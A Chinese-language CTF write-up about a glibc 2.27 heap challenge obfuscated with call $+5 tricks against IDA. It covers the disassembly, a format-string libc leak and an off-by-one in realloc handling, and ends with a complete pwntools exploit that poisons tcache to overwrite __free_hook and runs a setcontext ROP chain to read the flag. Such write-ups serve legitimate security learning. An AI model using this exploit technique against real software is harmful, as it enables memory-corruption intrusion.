---
title: "call $+5代码混淆"
slug: call-5
description: "通过call $+5 + 栈上返回地址修改代码混淆，破坏静态反汇编工具（如 IDA）的控制流分析，让伪代码生成失败或产生错误结果"
date: 2026-10-03
author: mixt
category: 无
tags: [无]
featured: false
draft: true
---
## 一,前言

> ` libc_2.27-3ubuntu1.4_amd64.so`

存在沙箱：

```sh
mixt@mixt-VMware-Virtual-Platform:~/pwn$ seccomp-tools dump ./service
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL

```

---





![image-20261003215942325](C:\Users\10935\AppData\Roaming\Typora\typora-user-images\image-20261003215942325.png)

本题感觉挺有意思的，因为当你想看伪代码的时候，你会发现里面是棍木

怎么做到的呢？原来它通过

```asm
.text:0000000000000F4E ; =============== S U B R O U T I N E =======================================
.text:0000000000000F4E
.text:0000000000000F4E ; Attributes: bp-based frame
.text:0000000000000F4E
.text:0000000000000F4E ; void sub_F4E()
.text:0000000000000F4E sub_F4E         proc near               ; CODE XREF: main+28↓p
.text:0000000000000F4E
.text:0000000000000F4E var_18          = qword ptr -18h
.text:0000000000000F4E
.text:0000000000000F4E ; __unwind {
.text:0000000000000F4E                 push    rbp
.text:0000000000000F4F                 mov     rbp, rsp
.text:0000000000000F52                 sub     rsp, 10h
.text:0000000000000F56                 call    $+5
.text:0000000000000F5B                 add     [rsp+18h+var_18], 6
.text:0000000000000F60                 retn
.text:0000000000000F60 sub_F4E         endp ; sp-analysis failed
.text:0000000000000F60
.text:0000000000000F61 ; ---------------------------------------------------------------------------
.text:0000000000000F61                 lea     rdi, asc_1167   ; "============================"
.text:0000000000000F68                 call    _puts
.text:0000000000000F6D                 lea     rdi, aWelcomeToTheGa ; "====welcome to the game====="
.text:0000000000000F74                 call    _puts
.text:0000000000000F79                 lea     rdi, asc_1167   ; "============================"
.text:0000000000000F80                 call    _puts
.text:0000000000000F85                 call    $+5
.text:0000000000000F8A                 add     qword ptr [rsp], 6
.text:0000000000000F8F                 retn
.text:0000000000000F90 ; ---------------------------------------------------------------------------
.text:0000000000000F90                 mov     dword ptr [rbp-8], 0
.text:0000000000000F97                 jmp     loc_1040
.text:0000000000000F9C ; ---------------------------------------------------------------------------
```

这个`call $+5`给IDA的编译卡掉了

---



## 二. 分析

```asm
.text:0000000000000FCB                 mov     eax, 0
.text:0000000000000FD0                 call    sub_BCA
.text:0000000000000FD5                 mov     [rbp-4], eax
.text:0000000000000FD8                 mov     eax, [rbp-4]
.text:0000000000000FDB                 cmp     eax, 4Eh ; 'N'
.text:0000000000000FDE                 jz      short loc_100E
.text:0000000000000FE0                 cmp     eax, 59h ; 'Y'
.text:0000000000000FE3                 jnz     short loc_1026
.text:0000000000000FE5                 mov     edi, 200h
.text:0000000000000FEA                 call    _malloc
.text:0000000000000FEF                 mov     cs:qword_202058, rax
.text:0000000000000FF6                 lea     rdi, aPleaseBuyGifts ; "please buy gifts for her+++++"
.text:0000000000000FFD                 call    _puts
.text:0000000000001002                 mov     eax, 0
.text:0000000000001007                 call    sub_E1D
.text:000000000000100C                 jmp     short loc_103C
```



程序会问你有女友吗，回答'N'，程序会让你输入原因并把原因`printf`（格式化字符串漏洞）

回答'Y'，程序会初始化`qword_202058`，给它分配一个0x210的chunk0

之后进入正常的交互菜单 

```text
1. New Paper
2. exit
>> $ 

```

逆向的时候会发现隐藏选项3（刷新回答，程序会再次问你有女友吗，使用次数为1）

和隐藏选项4（把`chunk0`作为`rdi`并`puts`），以下是选项4的汇编

```asm
.text:0000000000000CE8
.text:0000000000000CE8 sub_CE8         proc near               ; CODE XREF: .text:0000000000000E8D↓p
.text:0000000000000CE8
.text:0000000000000CE8 var_8           = qword ptr -8
.text:0000000000000CE8
.text:0000000000000CE8 ; __unwind {
.text:0000000000000CE8                 push    rbp
.text:0000000000000CE9                 mov     rbp, rsp
.text:0000000000000CEC                 call    $+5
.text:0000000000000CF1                 add     [rsp+8+var_8], 6
.text:0000000000000CF6                 retn
.text:0000000000000CF6 sub_CE8         endp ; sp-analysis failed
.text:0000000000000CF6
.text:0000000000000CF7 ; ---------------------------------------------------------------------------
.text:0000000000000CF7                 mov     eax, cs:dword_20204C
.text:0000000000000CFD                 test    eax, eax
.text:0000000000000CFF                 jle     short loc_D0F
.text:0000000000000D01                 lea     rdi, aNoChance  ; "no chance"
.text:0000000000000D08                 call    _puts
.text:0000000000000D0D                 jmp     short loc_D2E
.text:0000000000000D0F ; ---------------------------------------------------------------------------
.text:0000000000000D0F
.text:0000000000000D0F loc_D0F:                                ; CODE XREF: .text:0000000000000CFF↑j
.text:0000000000000D0F                 mov     rax, cs:qword_202058
.text:0000000000000D16                 mov     rdi, rax
.text:0000000000000D19                 call    _puts
.text:0000000000000D1E                 mov     eax, cs:dword_20204C
.text:0000000000000D24                 add     eax, 1
.text:0000000000000D27                 mov     cs:dword_20204C, eax
.text:0000000000000D2D                 nop
.text:0000000000000D2E
.text:0000000000000D2E loc_D2E:                                ; CODE XREF: .text:0000000000000D0D↑j
.text:0000000000000D2E                 pop     rbp
.text:0000000000000D2F                 retn
.text:0000000000000D2F ; } // starts at CE8
```

如果你选择回答'N'，就可以通过格式化字符串拿到`libc_base`

但进入菜单之后肯定不能交互，因为程序的堆块管理逻辑依赖`qword_202058`

这个时候`qword_202058`还没有初始化，如果去交互会直接崩溃

所以选择`cmd(3)`刷新一次，这次我有女友了，回答'Y'

以下是选项1的逻辑

```asm
.text:0000000000000D90 loc_D90:                                ; CODE XREF: sub_D30+54↑j
.text:0000000000000D90                 mov     eax, [rbp+var_4]
.text:0000000000000D93                 cdqe
.text:0000000000000D95                 mov     rdx, cs:qword_202058
.text:0000000000000D9C                 mov     rdx, [rdx]
.text:0000000000000D9F                 mov     rsi, rax        ; size
.text:0000000000000DA2                 mov     rdi, rdx        ; ptr
.text:0000000000000DA5                 call    _realloc
.text:0000000000000DAA                 mov     rdx, rax
.text:0000000000000DAD                 mov     rax, cs:qword_202058
.text:0000000000000DB4                 mov     [rax], rdx
.text:0000000000000DB7                 mov     rax, cs:qword_202058
.text:0000000000000DBE                 mov     rax, [rax]
.text:0000000000000DC1                 test    rax, rax
.text:0000000000000DC4                 jz      short loc_DFD
.text:0000000000000DC6                 cmp     [rbp+var_4], 0
.text:0000000000000DCA                 jz      short loc_DFD
.text:0000000000000DCC                 lea     rdi, aData      ; "data"
.text:0000000000000DD3                 call    _puts
.text:0000000000000DD8                 mov     eax, [rbp+var_4]
.text:0000000000000DDB                 add     eax, 1
.text:0000000000000DDE                 cdqe
.text:0000000000000DE0                 mov     rdx, cs:qword_202058
.text:0000000000000DE7                 mov     rdx, [rdx]
.text:0000000000000DEA                 mov     rcx, rdx
.text:0000000000000DED                 mov     rdx, rax        ; nbytes
.text:0000000000000DF0                 mov     rsi, rcx        ; buf
.text:0000000000000DF3                 mov     edi, 0          ; fd
.text:0000000000000DF8                 call    _read
.text:0000000000000DFD
.text:0000000000000DFD loc_DFD:                                ; CODE XREF: sub_D30+94↑j
.text:0000000000000DFD                                         ; sub_D30+9A↑j
.text:0000000000000DFD                 mov     eax, cs:dword_202050
.text:0000000000000E03                 add     eax, 1
.text:0000000000000E06                 mov     cs:dword_202050, eax
.text:0000000000000E0C                 call    $+5
.text:0000000000000E11                 add     [rsp+var_s0], 6
.text:0000000000000E16                 retn
.text:0000000000000E16 ; ---------------------------------------------------------------------------
.text:0000000000000E17                 align 8
.text:0000000000000E18                 jmp     short locret_E1B
.text:0000000000000E1A ; ---------------------------------------------------------------------------
.text:0000000000000E1A
.text:0000000000000E1A loc_E1A:                                ; CODE XREF: sub_D30+11↑j
.text:0000000000000E1A                 nop
.text:0000000000000E1B
.text:0000000000000E1B locret_E1B:                             ; CODE XREF: sub_D30+E8↑j
.text:0000000000000E1B                 leave
.text:0000000000000E1C                 retn
.text:0000000000000E1C ; } // starts at D30
```

`realloc`的`ptr`由chunk0管理，如果用选项4可以拿到堆地址（没用上）

**在glibc2.27下**

当`realloc(ptr,size)`的`ptr=NULL`时，`realloc`视为`malloc`，会从`tcache`取chunk

当`realloc(ptr,size)`的`size = 0时`，`realloc`视为`free`

> 在本题中，`free`的返回值会覆盖掉`ptr`，视为一次`ptr`的清空
>
> ```asm
> .text:0000000000000DAA                 mov     rdx, rax
> .text:0000000000000DAD                 mov     rax, cs:qword_202058
> .text:0000000000000DB4                 mov     [rax], rdx
> ```

当`ptr`存在时，假设`ptr`指向的`chunk1 = 0xa0`

* `realloc(chunk1,0x20)`，会直接切割`chunk1`，得到`chunk2 = 0x30，chunk3 = 0x70`，并释放`chunk3`
* `realloc(chunk1,0xb0)`，会分配`chunk2 = 0xb0`，释放`chunk1`，但这时`realloc`不会取`tcache`找`chunk2`

---



```asm
.text:0000000000000DD8                 mov     eax, [rbp+var_4]
.text:0000000000000DDB                 add     eax, 1
```

这里还有一个`off - by - one`漏洞



## 三 .思路

> 在`glibc 2.27`，`unlink`不会检查`size/prevsize`，`malloc`不会检查`tcache_count`，释放`tcache chunk`不会检查`next chunk size`

布置三个chunk

```python
 add(0xf0,b'a') #chunk 0 
 delete()
 add(0x100,b'a')  #chunk 1
 delete()
 add(0x220,b"a"*0x50 + p64(0x170) + p64(0x220-0x50)) #chunk 2
 delete()

```

之后申请回chunk0利用`off - by -one`

改掉chunk1的`size`为0x170，在chunk2提前布置数据，使得fake chunk通过检查

释放chunk1，再申请chunk1，得到了`fake chunk1 size= 0x170`

利用堆重叠修改`fake chunk2 size= 随便一个数`（别跟`fd`抢`tcache`位子就行），设置`fd = __free_hook`

```sh
pwndbg> bins
tcachebins
0x20 [  7]: 0x6212d7cdc8b0 —▸ 0x6212d7cdc9c0 —▸ 0x6212d7cdcc70 —▸ 0x6212d7cdcdf0 —▸ 0x6212d7cdcc50 —▸ 0x6212d7cdcf00 —▸ 0x6212d7cdcad0 ◂— 0
0x50 [  1]: 0x6212d7cdcf20 ◂— 0
0x70 [  7]: 0x6212d7cdc7c0 —▸ 0x6212d7cdcb60 —▸ 0x6212d7cdc8d0 —▸ 0x6212d7cdcaf0 —▸ 0x6212d7cdcc90 —▸ 0x6212d7cdce10 —▸ 0x6212d7cdc9e0 ◂— 0
0x80 [  5]: 0x6212d7cdc830 —▸ 0x6212d7cdc940 —▸ 0x6212d7cdcbd0 —▸ 0x6212d7cdce80 —▸ 0x6212d7cdca50 ◂— 0
0xd0 [  1]: 0x6212d7cdc310 ◂— 0
0xf0 [  2]: 0x6212d7cdcd00 —▸ 0x6212d7cdc670 ◂— 0
0x100 [  1]: 0x6212d7cdd180 ◂— 0
0x170 [  1]: 0x6212d7cdd280 ◂— 0
0x230 [  0]: 0x7eeae9fed8e8 (__free_hook) ◂— ...
0x400 [  1]: 0x6212d7cdd390 ◂— 0

```

这里我改成了0x400，一开始不知道`glibc 2.27`连`next size`都不会检查，寻思半天怎么让chunk2不抢位子，后来发现随便改个其他数就行

之后我又在寻思怎么布置`tcache_count`，发现`malloc`不会检查这东西，于是直接申请出`__free_hook`

```sh
0x230 [ -1]: 0

```

负数都出来了

之后改`free_hook`为`setcontext + 53`走`orw`即可



## 四.Exploit

```python
  1 from pwn import*
  2 io=process(b'./service_patched')
  3 #io=remote(b'node4.anna.nssctf.cn',21763)
  4 libc=ELF(b'/home/mixt/pwn/libc6_2.27-3ubuntu1.4_amd64.so')
  5 #io=remote(b'node4.anna.nssctf.cn',24553)
  6 #n 78 y 89
  7 def cmd(choice):
  8     io.sendlineafter(b'>>',str(choice).encode())
  9 def add(size,content=b'a'):
 10     cmd(1)
 11     io.sendlineafter(b'size',str(size).encode())
 12     io.recvuntil(b'data')
 13     io.send(content)
 14 def delete():
 15     cmd(1)
 16     io.sendlineafter(b'size',str(0).encode())
 17 io.sendafter(b'grilfriend ?',b'78')
 18 io.recvuntil('reason')
 19 io.send(b'%a')
 20 io.recvuntil(b"0x0.")
 21 libc_base =int(io.recv(13).decode(),16) - 0x3EC7E3
 22 success("libc_base:" + hex(libc_base))
 23 cmd(3)
 24 io.sendafter(b'grilfriend ?',b'89')
 25 add(0xf0,b'a')
 26 delete()
 27 add(0x100,b'a')
 28 delete()
 29 add(0x220,b"a"*0x50 + p64(0x170) + p64(0x220-0x50))
 30 delete()
 31 add(0xf8,b'a' * 0xf8 + p8(0x71))
 32 delete()
 33 add(0x100,b"a")
 34 delete()
 35 free_hook=libc_base + libc.symbols['__free_hook']
 36 setcontext=libc_base + libc.symbols['setcontext'] + 53
 37 success("setcontext:" + hex(setcontext))
 38 pop_rdi=0x215bf + libc_base
 39 pop_rsi=0x23eea + libc_base
 40 pop_rdx=0x1b96 + libc_base
 41 ret=0x8aa + libc_base
 42 write_addr=libc_base + libc.symbols['write']
 43 read_addr=libc_base + libc.symbols['read']
 44 open_addr=libc_base + libc.symbols['open']
 45 add(0x168,b"a"*0x108 + p64(0x400) + p64(free_hook))
 46 delete()
 47 flag=free_hook + 0x200
 48 orw=p64(0) + p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(0) + p64(open_addr)
 49 orw+=p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(free_hook + 0x200) + p64(pop_rdx) + p64(0x50) + p64(read_addr)
 50 orw+=p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(free_hook + 0x200) + p64(pop_rdx) + p64(0x50) + p64(write_addr)
 51 payload=p64(setcontext)
 52 payload+=b'\x00' *(0xa0 - len(payload))
 53 payload+=p64(free_hook + 0xa0) + p64(pop_rdx)
 54 payload+=orw
 55 payload+=b'\x00' *(0x200 - len(payload))
 56 payload+=b'/home/ctf/flag.txt\x00'
 57 add(0x220,b'a')
 58 delete()
 59 gdb.attach(io)
 60 add(0x220,payload)           #free_hook
 61 #gdb.attach(io,"b *setcontext + 53")
 62 delete()
 63 io.interactive()

```



